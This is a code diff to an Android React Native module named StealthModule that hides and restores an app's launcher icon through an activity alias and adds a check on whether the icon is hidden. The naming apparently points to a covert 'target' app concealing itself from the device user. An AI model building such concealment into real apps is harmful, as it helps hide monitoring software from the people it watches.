@@ -26,13 +26,14 @@ public class StealthModule extends ReactContextBaseJavaModule {
         try {
             Context context = getReactApplicationContext();
             PackageManager p = context.getPackageManager();
-            // We target MainActivity - this will hide the launcher icon
-            ComponentName componentName = new ComponentName(context, "com.zulpikarsandira.xnuver.target.MainActivity");
+            // Target the ALIAS instead of MainActivity for safety
+            ComponentName componentName = new ComponentName(context,
+                    "com.zulpikarsandira.xnuver.target.MainActivityAlias");
             p.setComponentEnabledSetting(componentName,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP);
 
-            Log.d(TAG, "App icon hidden successfully");
+            Log.d(TAG, "App icon (alias) hidden successfully");
         } catch (Exception e) {
             Log.e(TAG, "Error hiding app icon: " + e.getMessage());
         }
@@ -43,14 +44,30 @@ public class StealthModule extends ReactContextBaseJavaModule {
         try {
             Context context = getReactApplicationContext();
             PackageManager p = context.getPackageManager();
-            ComponentName componentName = new ComponentName(context, "com.zulpikarsandira.xnuver.target.MainActivity");
+            // Target the ALIAS
+            ComponentName componentName = new ComponentName(context,
+                    "com.zulpikarsandira.xnuver.target.MainActivityAlias");
             p.setComponentEnabledSetting(componentName,
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     PackageManager.DONT_KILL_APP);
 
-            Log.d(TAG, "App icon restored successfully");
+            Log.d(TAG, "App icon (alias) restored successfully");
         } catch (Exception e) {
             Log.e(TAG, "Error showing app icon: " + e.getMessage());
+        }
+    }
+
+    @ReactMethod
+    public void isIconHidden(com.facebook.react.bridge.Promise promise) {
+        try {
+            Context context = getReactApplicationContext();
+            PackageManager p = context.getPackageManager();
+            ComponentName componentName = new ComponentName(context,
+                    "com.zulpikarsandira.xnuver.target.MainActivityAlias");
+            int setting = p.getComponentEnabledSetting(componentName);
+            promise.resolve(setting == PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
+        } catch (Exception e) {
+            promise.reject("ERR", e.getMessage());
         }
     }
 
